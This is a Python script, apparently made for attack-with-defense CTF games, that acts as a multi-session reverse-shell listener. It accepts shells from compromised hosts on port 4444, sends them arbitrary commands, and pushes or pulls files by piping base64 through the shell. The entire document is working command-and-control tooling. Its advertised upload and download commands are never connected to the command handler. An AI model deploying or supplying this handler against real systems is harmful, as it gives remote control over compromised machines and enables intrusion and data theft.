#!/usr/bin/env python3
"""
AWD 反弹 Shell 监听控制器
用途: 监听反弹 Shell, 批量执行命令, 保存会话
"""

import socket
import threading
import sys
import time
import select


class AWDListener:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = {}  # {id: (conn, addr)}
        self.running = True
        self.current_client = None
        self.id_counter = 0

    def start(self):
        """启动监听服务"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(10)
        self.server_socket.settimeout(1)

        print(f"[*] 监听 {self.host}:{self.port} ...")
        print(f"[*] 等待反弹 Shell 连接...")

        # 接受连接线程
        accept_thread = threading.Thread(target=self._accept_clients, daemon=True)
        accept_thread.start()

        # 主循环
        self._interactive_shell()

    def _accept_clients(self):
        """接受客户端连接"""
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                self.id_counter += 1
                client_id = self.id_counter
                self.clients[client_id] = (conn, addr)
                print(f"\n[+] 新连接 #{client_id}: {addr[0]}:{addr[1]}")
                if self.current_client is None:
                    self.current_client = client_id
                    print(f"[*] 已切换到客户端 #{client_id}")
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[-] 接受失败: {e}")

    def _interactive_shell(self):
        """交互式 Shell"""
        print("\n" + "="*50)
        print("  AWD Listener - 命令帮助")
        print("="*50)
        print("  sessions    - 显示所有会话")
        print("  use <id>    - 切换到指定会话")
        print("  kill <id>   - 关闭指定会话")
        print("  background  - 后台当前会话")
        print("  upload <local> <remote> - 上传文件")
        print("  download <remote> <local> - 下载文件")
        print("  help        - 显示帮助")
        print("  quit        - 退出")
        print("="*50)
        print()

        while self.running:
            try:
                cmd = input(f"[AWD#{self.current_client}] $ ").strip()
                self._handle_command(cmd)
            except KeyboardInterrupt:
                print("\n[!] 使用 quit 退出")
            except EOFError:
                break

        self.stop()

    def _handle_command(self, cmd):
        """处理命令"""
        if not cmd:
            return

        parts = cmd.split()
        action = parts[0].lower()

        if action == 'quit' or action == 'exit':
            self.running = False
        elif action == 'sessions':
            self._show_sessions()
        elif action == 'use' and len(parts) > 1:
            self.current_client = int(parts[1])
            print(f"[*] 已切换到客户端 #{self.current_client}")
        elif action == 'kill' and len(parts) > 1:
            self._kill_client(int(parts[1]))
        elif action == 'help':
            print("参考上方帮助信息")
        elif self.current_client and self.current_client in self.clients:
            self._send_command(cmd)
        else:
            print("[!] 没有活跃的会话, 使用 sessions 查看或 use 切换")

    def _show_sessions(self):
        """显示所有会话"""
        if not self.clients:
            print("[!] 暂无会话")
            return
        for cid, (conn, addr) in self.clients.items():
            prefix = "*" if cid == self.current_client else " "
            print(f"  {prefix} #{cid}: {addr[0]}:{addr[1]}")

    def _kill_client(self, client_id):
        """关闭客户端"""
        if client_id in self.clients:
            conn, addr = self.clients[client_id]
            conn.close()
            del self.clients[client_id]
            if self.current_client == client_id:
                self.current_client = None
            print(f"[-] 已关闭会话 #{client_id}")

    def _send_command(self, cmd):
        """向当前客户端发送命令"""
        conn, addr = self.clients[self.current_client]
        try:
            conn.sendall((cmd + '\n').encode())
            time.sleep(0.1)

            # 接收响应
            response = self._recv_response(conn)
            if response:
                print(response.decode(errors='ignore'), end='')
        except Exception as e:
            print(f"[-] 命令发送失败: {e}")
            self._kill_client(self.current_client)

    def _recv_response(self, conn, timeout=1):
        """接收响应数据"""
        data = b''
        start = time.time()

        while time.time() - start < timeout:
            rlist, _, _ = select.select([conn], [], [], 0.1)
            if rlist:
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    start = time.time()  # 重置超时
                except Exception:
                    break
        return data

    def upload_file(self, local_path, remote_path):
        """上传文件到远程主机"""
        import base64
        conn, addr = self.clients[self.current_client]

        with open(local_path, 'rb') as f:
            data = base64.b64encode(f.read()).decode()

        cmd = f"echo '{data}' | base64 -d > {remote_path}\n"
        conn.sendall(cmd.encode())
        time.sleep(0.5)
        response = self._recv_response(conn)
        print(f"[+] 文件已上传: {remote_path}")

    def download_file(self, remote_path, local_path):
        """从远程主机下载文件"""
        import base64
        conn, addr = self.clients[self.current_client]

        cmd = f"base64 {remote_path}\n"
        conn.sendall(cmd.encode())
        time.sleep(0.5)
        response = self._recv_response(conn)

        try:
            data = base64.b64decode(response)
            with open(local_path, 'wb') as f:
                f.write(data)
            print(f"[+] 文件已下载: {local_path}")
        except Exception as e:
            print(f"[-] 下载失败: {e}")

    def stop(self):
        """停止监听"""
        self.running = False
        for cid, (conn, addr) in self.clients.items():
            conn.close()
        if self.server_socket:
            self.server_socket.close()
        print("[*] 监听已停止")


if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

    listener = AWDListener(host, port)
    listener.start()
